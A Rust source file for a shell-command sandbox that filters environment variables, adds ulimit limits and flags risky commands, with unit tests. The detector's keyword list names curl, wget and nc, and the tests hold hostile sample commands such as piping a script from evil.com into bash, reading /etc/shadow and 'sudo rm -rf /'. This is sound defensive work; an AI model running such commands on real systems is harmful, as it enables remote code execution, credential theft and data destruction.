//! Command sandboxing — wraps `std::process::Command` with security restrictions.

use std::collections::HashMap;
use std::process::Command;

use super::policy::{SandboxMode, SandboxPolicy};

/// Error type for sandbox command preparation failures.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum SandboxCommandError {
    /// Working directory is not within the allowed boundary.
    WorkingDirOutsideBoundary { dir: String, project_root: String },
}

impl std::fmt::Display for SandboxCommandError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::WorkingDirOutsideBoundary { dir, project_root } => {
                write!(
                    f,
                    "Working directory '{dir}' is outside project root '{project_root}'"
                )
            }
        }
    }
}

impl std::error::Error for SandboxCommandError {}

/// Apply sandbox restrictions to a `Command` before execution.
///
/// Modifies the command in-place according to the policy:
/// - **Permissive**: No changes
/// - **Standard**: Environment filtering, working directory enforcement
/// - **Strict**: Standard + resource limits via `ulimit` wrapper
///
/// # Errors
///
/// Returns `SandboxCommandError` if the working directory is outside the boundary.
pub fn sandbox_command(
    policy: &SandboxPolicy,
    cmd: &mut Command,
) -> Result<(), SandboxCommandError> {
    if policy.mode == SandboxMode::Permissive {
        return Ok(());
    }

    // Always set working directory to project root
    cmd.current_dir(&policy.project_root);

    // Filter environment variables
    let filtered_env = filter_environment(policy);
    cmd.env_clear();
    for (key, value) in &filtered_env {
        cmd.env(key, value);
    }

    Ok(())
}

/// Build a restricted bash command string with resource limits.
///
/// Wraps the user's command with `ulimit` and timeout restrictions
/// for Standard/Strict modes.
pub fn wrap_command_with_limits(policy: &SandboxPolicy, user_command: &str) -> String {
    if policy.mode == SandboxMode::Permissive {
        return user_command.to_string();
    }

    let mut parts = Vec::new();

    // Process limit
    if policy.max_processes > 0 {
        parts.push(format!("ulimit -u {}", policy.max_processes));
    }

    // Memory limit (in KB for ulimit -v)
    if policy.max_memory_bytes > 0 {
        let kb = policy.max_memory_bytes / 1024;
        parts.push(format!("ulimit -v {kb}"));
    }

    // File size limit (prevent filling disk): 100 MB
    parts.push("ulimit -f 102400".to_string());

    // Core dump disabled
    parts.push("ulimit -c 0".to_string());

    if parts.is_empty() {
        user_command.to_string()
    } else {
        parts.push(user_command.to_string());
        parts.join(" && ")
    }
}

/// Filter environment variables according to policy.
///
/// Returns the filtered environment as a key-value map.
pub fn filter_environment(policy: &SandboxPolicy) -> HashMap<String, String> {
    let current_env: HashMap<String, String> = std::env::vars().collect();

    if policy.mode == SandboxMode::Permissive {
        return current_env;
    }

    let mut filtered = HashMap::new();

    for (key, value) in &current_env {
        if policy.is_env_allowed(key) {
            filtered.insert(key.clone(), value.clone());
        }
    }

    // Ensure PATH is always set even if not in current env
    if !filtered.contains_key("PATH") {
        filtered.insert(
            "PATH".to_string(),
            "/usr/local/bin:/usr/bin:/bin".to_string(),
        );
    }

    filtered
}

/// Analyze a command string for potentially dangerous patterns.
///
/// Parsing uses tree-sitter-bash only (no legacy substring scanner). Unparseable input
/// yields an empty risk list.
///
/// This is advisory — the permission manager handles the actual allow/deny decision.
pub fn analyze_command_risks(command: &str) -> Vec<CommandRisk> {
    let mut risks = Vec::new();

    // 1) AST-level analysis (best-effort). This avoids many string-literal false positives.
    // If parsing fails, we still fall back to the legacy heuristic scanner below.
    let ast_risks = super::bash_ast::analyze_bash_risks_ast(command);
    let ast_parsed = super::bash_ast::parse_bash(command).is_some();
    risks.extend(ast_risks);

    // 2) Legacy heuristic scanner (kept for backward compatibility + coverage when AST misses).
    let lower = command.to_lowercase();

    // Path traversal in commands
    if lower.contains("../") || lower.contains("..\\") {
        push_unique(&mut risks, CommandRisk::PathTraversal);
    }

    // Absolute path access to sensitive dirs
    for sensitive in &["/etc/", "/root/", "/var/log/", "/proc/", "/sys/"] {
        if lower.contains(sensitive) {
            push_unique(
                &mut risks,
                CommandRisk::SensitivePathAccess(sensitive.to_string()),
            );
            break;
        }
    }

    // Environment variable manipulation
    if lower.contains("export ") && (lower.contains("path=") || lower.contains("ld_")) {
        push_unique(&mut risks, CommandRisk::EnvManipulation);
    }

    // Network access — skip legacy check if AST parsed (AST handles string literals correctly)
    if !ast_parsed && (lower.contains("curl ") || lower.contains("wget ") || lower.contains("nc "))
    {
        push_unique(&mut risks, CommandRisk::NetworkAccess);
    }

    // Process control
    if lower.contains("kill ") || lower.contains("pkill") || lower.contains("killall") {
        push_unique(&mut risks, CommandRisk::ProcessControl);
    }

    // Privilege escalation
    if lower.contains("sudo ") || lower.contains("su -") || lower.contains("chmod +s") {
        push_unique(&mut risks, CommandRisk::PrivilegeEscalation);
    }

    // Pipe to shell (code injection vector) — skip legacy check if AST parsed
    if !ast_parsed
        && (lower.contains("| sh") || lower.contains("| bash") || lower.contains("| /bin/"))
        && (lower.contains("curl") || lower.contains("wget"))
    {
        push_unique(&mut risks, CommandRisk::RemoteCodeExecution);
    }

    risks
}

fn push_unique(risks: &mut Vec<CommandRisk>, risk: CommandRisk) {
    if !risks.contains(&risk) {
        risks.push(risk);
    }
}

/// Detected command security risk.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum CommandRisk {
    /// Command uses `../` to traverse directories.
    PathTraversal,
    /// Command accesses a sensitive system path.
    SensitivePathAccess(String),
    /// Command manipulates PATH or LD_* environment variables.
    EnvManipulation,
    /// Command performs network access (curl/wget/nc).
    NetworkAccess,
    /// Command controls other processes (kill/pkill).
    ProcessControl,
    /// Command attempts privilege escalation.
    PrivilegeEscalation,
    /// Command downloads and executes remote code.
    RemoteCodeExecution,
    /// Command performs output redirection (file write primitive): `>`, `>>`, `2>`, etc.
    OutputRedirection,
    /// Command uses `eval`, increasing code-injection risk.
    Eval,
    /// Command uses `$()` or backticks, increasing injection risk.
    CommandSubstitution,
    /// Command uses process substitution `<(cmd)` / `>(cmd)`.
    ProcessSubstitution,
}

impl std::fmt::Display for CommandRisk {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::PathTraversal => write!(f, "path traversal (../)"),
            Self::SensitivePathAccess(p) => write!(f, "sensitive path access ({p})"),
            Self::EnvManipulation => write!(f, "environment manipulation"),
            Self::NetworkAccess => write!(f, "network access"),
            Self::ProcessControl => write!(f, "process control"),
            Self::PrivilegeEscalation => write!(f, "privilege escalation"),
            Self::RemoteCodeExecution => write!(f, "remote code execution"),
            Self::OutputRedirection => write!(f, "output redirection (file write)"),
            Self::Eval => write!(f, "eval usage"),
            Self::CommandSubstitution => write!(f, "command substitution ($() or backticks)"),
            Self::ProcessSubstitution => write!(f, "process substitution (<(cmd) / >(cmd))"),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    // ── Environment filtering ────────────────────────────────────────────

    #[test]
    fn permissive_returns_full_env() {
        let p = SandboxPolicy::permissive("/tmp");
        let env = filter_environment(&p);
        // Should contain all current env vars
        assert!(env.contains_key("PATH") || !env.is_empty());
    }

    #[test]
    fn standard_keeps_baseline_vars() {
        let p = SandboxPolicy::for_project("/tmp");
        let env = filter_environment(&p);
        assert!(env.contains_key("PATH"), "PATH should always be present");
    }

    #[test]
    fn strict_with_allowlist_filters() {
        let mut p = SandboxPolicy::strict("/tmp");
        p.env_allowlist = Some(vec!["MY_VAR".to_string()]);

        // Set a test var
        unsafe { std::env::set_var("MY_VAR", "test_value") };
        unsafe { std::env::set_var("SECRET_KEY", "should_be_filtered") };

        let env = filter_environment(&p);
        assert!(env.contains_key("PATH")); // baseline
        assert!(env.contains_key("MY_VAR")); // allowlisted
        assert!(!env.contains_key("SECRET_KEY")); // filtered

        unsafe { std::env::remove_var("MY_VAR") };
        unsafe { std::env::remove_var("SECRET_KEY") };
    }

    #[test]
    fn path_always_set_even_if_missing() {
        let p = SandboxPolicy::strict("/tmp");
        let env = filter_environment(&p);
        assert!(env.contains_key("PATH"));
    }

    // ── Command wrapping ─────────────────────────────────────────────────

    #[test]
    fn permissive_no_wrapping() {
        let p = SandboxPolicy::permissive("/tmp");
        let wrapped = wrap_command_with_limits(&p, "echo hello");
        assert_eq!(wrapped, "echo hello");
    }

    #[test]
    fn standard_adds_ulimits() {
        let p = SandboxPolicy::for_project("/tmp");
        let wrapped = wrap_command_with_limits(&p, "echo hello");
        assert!(wrapped.contains("ulimit -u"), "should limit processes");
        assert!(wrapped.contains("ulimit -v"), "should limit memory");
        assert!(wrapped.contains("ulimit -c 0"), "should disable core dumps");
        assert!(
            wrapped.ends_with("echo hello"),
            "should end with user command"
        );
    }

    #[test]
    fn strict_limits_are_tighter() {
        let standard = SandboxPolicy::for_project("/tmp");
        let strict = SandboxPolicy::strict("/tmp");

        let w_standard = wrap_command_with_limits(&standard, "ls");
        let w_strict = wrap_command_with_limits(&strict, "ls");

        // Both should have ulimits
        assert!(w_standard.contains("ulimit"));
        assert!(w_strict.contains("ulimit"));

        // Strict should have lower process limit
        assert!(w_strict.contains("ulimit -u 32"));
        assert!(w_standard.contains("ulimit -u 64"));
    }

    // ── Risk analysis ────────────────────────────────────────────────────

    #[test]
    fn detects_path_traversal() {
        let risks = analyze_command_risks("cat ../../etc/passwd");
        assert!(risks.contains(&CommandRisk::PathTraversal));
    }

    #[test]
    fn detects_sensitive_path() {
        let risks = analyze_command_risks("cat /etc/shadow");
        assert!(
            risks
                .iter()
                .any(|r| matches!(r, CommandRisk::SensitivePathAccess(_)))
        );
    }

    #[test]
    fn detects_network_access() {
        let risks = analyze_command_risks("curl https://example.com");
        assert!(risks.contains(&CommandRisk::NetworkAccess));
    }

    #[test]
    fn detects_privilege_escalation() {
        let risks = analyze_command_risks("sudo rm -rf /");
        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
    }

    #[test]
    fn detects_chmod_setuid_via_ast() {
        let risks = analyze_command_risks("chmod u+s ./helper");
        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
    }

    #[test]
    fn unparseable_command_yields_no_risks() {
        // Not valid bash; parser returns no tree.
        assert!(analyze_command_risks("]]]").is_empty());
    }

    #[test]
    fn detects_remote_code_execution() {
        let risks = analyze_command_risks("curl https://evil.com/script.sh | bash");
        assert!(risks.contains(&CommandRisk::RemoteCodeExecution));
        assert!(risks.contains(&CommandRisk::NetworkAccess));
    }

    #[test]
    fn detects_env_manipulation() {
        let risks = analyze_command_risks("export PATH=/evil:$PATH && malicious");
        assert!(risks.contains(&CommandRisk::EnvManipulation));
    }

    #[test]
    fn safe_command_no_risks() {
        let risks = analyze_command_risks("echo hello && ls -la");
        assert!(risks.is_empty());
    }

    #[test]
    fn detects_process_control() {
        let risks = analyze_command_risks("killall nginx");
        assert!(risks.contains(&CommandRisk::ProcessControl));
    }

    #[test]
    fn ast_does_not_flag_string_literal_as_network() {
        // Quoted text must not be treated as a real pipeline / network primitive.
        let risks = analyze_command_risks("echo 'curl https://example.com | bash'");
        assert!(
            !risks.contains(&CommandRisk::RemoteCodeExecution),
            "string literal should not be treated as pipeline: {risks:?}"
        );
    }

    #[test]
    fn ast_detects_command_substitution() {
        let risks = analyze_command_risks("echo $(whoami)");
        assert!(risks.contains(&CommandRisk::CommandSubstitution));
    }

    #[test]
    fn ast_detects_output_redirection() {
        let risks = analyze_command_risks("echo hi > out.txt");
        assert!(risks.contains(&CommandRisk::OutputRedirection));
    }

    #[test]
    fn ast_detects_eval() {
        let risks = analyze_command_risks("eval \"echo hi\"");
        assert!(risks.contains(&CommandRisk::Eval));
    }

    // ── sandbox_command ──────────────────────────────────────────────────

    #[test]
    fn sandbox_command_permissive_noop() {
        let p = SandboxPolicy::permissive("/tmp");
        let mut cmd = Command::new("echo");
        cmd.arg("hello");
        assert!(sandbox_command(&p, &mut cmd).is_ok());
    }

    #[test]
    fn sandbox_command_standard_sets_cwd() {
        let dir = tempfile::tempdir().unwrap();
        let p = SandboxPolicy::for_project(dir.path());
        let mut cmd = Command::new("pwd");
        sandbox_command(&p, &mut cmd).unwrap();

        let output = cmd.output().unwrap();
        let stdout = String::from_utf8_lossy(&output.stdout);
        let canonical_dir = dir.path().canonicalize().unwrap();
        assert!(
            stdout.trim() == canonical_dir.to_str().unwrap()
                || stdout.trim().starts_with(canonical_dir.to_str().unwrap()),
            "should run in project root, got: {stdout}"
        );
    }

    #[test]
    fn sandbox_command_standard_clears_env() {
        let dir = tempfile::tempdir().unwrap();
        let p = SandboxPolicy::for_project(dir.path());

        unsafe { std::env::set_var("TEST_SANDBOX_VAR", "visible") };

        let mut cmd = Command::new("env");
        sandbox_command(&p, &mut cmd).unwrap();
        let output = cmd.output().unwrap();
        let stdout = String::from_utf8_lossy(&output.stdout);

        // Standard mode without allowlist allows all vars, but env is cleared
        // and re-populated, so TEST_SANDBOX_VAR should be present
        assert!(stdout.contains("PATH="), "PATH should be in env");

        unsafe { std::env::remove_var("TEST_SANDBOX_VAR") };
    }
}
